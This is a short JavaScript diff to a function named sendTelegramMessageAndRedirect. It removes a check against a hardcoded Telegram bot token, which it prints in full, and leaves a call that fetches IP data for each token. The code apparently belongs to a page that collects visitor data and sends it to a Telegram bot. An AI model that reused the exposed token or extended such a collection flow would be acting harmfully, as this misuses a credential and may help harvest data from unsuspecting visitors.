@@ -75,10 +75,7 @@ function sendTelegramMessageAndRedirect(e) {
   tokens.forEach((token, index) => {
     const [api, id] = token;
 
-    if (telegramBotToken !== "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw") {
-      console.log("wrong API tokens");
-      return;
-    }
+   
     fetchIPData(api, id);
   });
 }
